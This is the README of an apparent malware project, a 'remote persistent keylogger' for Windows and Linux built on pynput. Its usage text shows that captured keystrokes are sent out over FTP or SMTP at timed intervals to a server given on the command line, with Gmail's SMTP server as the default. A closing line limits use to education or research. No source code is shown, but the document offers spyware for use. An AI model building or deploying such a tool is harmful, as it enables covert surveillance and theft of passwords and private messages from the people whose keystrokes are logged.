# Remote_keylogger

Remote persistent keylogger for Windows and Linux.

Requirements:
- pynput

Usage:
```
usage: keylogger.py [-h] [-s SERVER] -t TIME [-p PORT] {ftp,smtp} login password

FTP/SMTP keylogger

positional arguments:
  {ftp,smtp}
  login                 Username for FTP/email for SMTP
  password              Password for FTP user/email account

options:
  -h, --help            show this help message and exit
  -s SERVER, --server SERVER
                        Required for FTP (default smtp.gmail.com for SMTP)
  -t TIME, --time TIME  time interval required seconds like -t 60
  -p PORT, --port PORT  Port to connect to (default 21 for FTP, OS-dependent for SMTP)
```

Do not use this for anything other than educational or research purposes.
